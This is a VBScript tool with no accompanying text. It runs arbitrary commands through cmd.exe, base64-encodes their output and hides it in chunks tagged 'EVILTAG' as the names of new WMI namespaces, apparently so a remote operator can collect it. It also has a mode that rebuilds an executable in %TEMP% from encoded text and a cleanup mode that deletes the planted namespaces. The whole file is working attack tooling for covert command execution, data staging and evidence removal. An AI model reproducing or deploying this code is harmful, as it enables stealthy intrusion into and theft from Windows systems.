Function base64_encode( byVal strIn )
    Base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    Dim w1, w2, w3, i, totalLen, strOut
    totalLen = Len(strIn)
    If Not ((totalLen Mod 3) = 0) Then totalLen = totalLen + 3 - (totalLen Mod 3)
    For i = 1 To totalLen Step 3
        w1 = prepare( Mid( strIn, i, 1 ) )
        w2 = prepare( Mid( strIn, i + 1, 1 ) )
        w3 = prepare( Mid( strIn, i + 2, 1 ) )
        strOut = strOut + Mid( Base64Chars, ( Int( w1 / 4 ) And 63 ) + 1 , 1 )
        strOut = strOut + Mid( Base64Chars, ( ( w1 * 16 + Int( w2 / 16 ) ) And 63 ) + 1, 1 )
	If (w2 Or w3) Then
	    strOut = strOut + Mid( Base64Chars, ( ( w2 * 4 + Int( w3 / 64 ) ) And 63 ) + 1, 1 )
	    If w3 Then
		strOut = strOut + Mid( Base64Chars, (w3 And 63 ) + 1, 1)
	    End If
	End If
    Next
    base64_encode = strOut
End Function
Function prepare( byVal strIn )
    If Len( strIn ) = 0 Then
        prepare = 0 : Exit Function
    Else
        prepare = Asc(strIn)
    End If
End Function
Function base64_decode(byVal strIn)
	Dim w1, w2, w3, w4, n, strOut
	For n = 1 To Len(strIn) Step 4
	w1 = mimedecode(Mid(strIn, n, 1))
	w2 = mimedecode(Mid(strIn, n + 1, 1))
	w3 = mimedecode(Mid(strIn, n + 2, 1))
	w4 = mimedecode(Mid(strIn, n + 3, 1))
	If Not w2 Then _
		strOut = strOut + Chr(((w1 * 4 + Int(w2 / 16)) And 255))
	If Not w3 Then _
		strOut = strOut + Chr(((w2 * 16 + Int(w3 / 4)) And 255))
	If Not w4 Then _
		strOut = strOut + Chr(((w3 * 64 + w4) And 255))
	Next
	base64_decode = strOut
End Function
Function mimedecode(byVal strIn)
	Base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	If Len(strIn) = 0 Then
		mimedecode = -1 : Exit Function
	Else
		mimedecode = InStr(Base64Chars, strIn) - 1
	End If
End Function
Function parseCmdOutput(cmdOutput)
	strLen = Len(cmdOutput)
	pieceLen = 5500
	nbOfPieces = Int(strLen/pieceLen)
	For i = 1 to nbOfPieces
		piece = Left(cmdOutput,pieceLen)
		piece = "        " + piece + "        "
		cmdOutput = Mid(cmdOutput,pieceLen+1)
		insertPiece i,piece
	Next
	cmdOutput = "        " + cmdOutput + "        "
	insertPiece nbOfPieces+1,cmdOutput		
End Function
Function insertPiece(ByVal number,ByVal piece)
	count = CStr(number)
	zeros = String(6 - Len(count), "0")
	tag = "EVILTAG" + zeros + count
	piece = base64_encode(piece)
	piece = Replace(piece,"+","Ó")
	piece = Replace(piece,"/","_")
	piece = tag + piece	
	Set aShell = CreateObject("WScript.Shell")
	aShell.Exec("%comspec%" + " /c " + "wmic /NAMESPACE:\\root\default PATH __Namespace CREATE Name='" + piece + "'")
        WScript.Sleep 50
End Function
Set myShell = CreateObject("WScript.Shell")
comspec = myShell.ExpandEnvironmentStrings("%comspec%")
tempdir = myShell.ExpandEnvironmentStrings("%TEMP%")
Select Case WScript.Arguments.Item(0)
    Case "cleanup"
	myShell.Exec(comspec + " /c " + "wmic /NAMESPACE:\\root\default PATH __Namespace where ""Name like 'DOWNLOAD_READY'"" delete")
	myShell.Exec(comspec + " /c " + "wmic /NAMESPACE:\\root\default PATH __Namespace where ""Name like '%EVILTAG%'"" delete") 
    Case "decode_tool"
	Set fso = CreateObject("Scripting.FileSystemObject")
	fileSize = fso.GetFile(tempdir + "\ENCODED").Size
	Set f2 = fso.OpenTextFile(tempdir + "\ENCODED", 1)
	data = f2.Read(fileSize)
	f2.Close
	data = Replace(data," ","")
	data = Replace(data,vbCrLf,"")
	Set f3 = fso.OpenTextFile(tempdir + "\base64.exe",2,True)
	f3.Write(base64_decode(data))
	f3.Close
    Case Else
	set cmdExecution = myShell.exec("C:\WINDOWS\system32\cmd.exe" + " /c " + WScript.Arguments.Item(0)) 
	cmdOutput = cmdExecution.StdOut.ReadAll 
	parseCmdOutput cmdOutput 
	myShell.Exec("%comspec%" + " /c " + "wmic /NAMESPACE:\\root\default PATH __Namespace CREATE Name='DOWNLOAD_READY'")
End Select
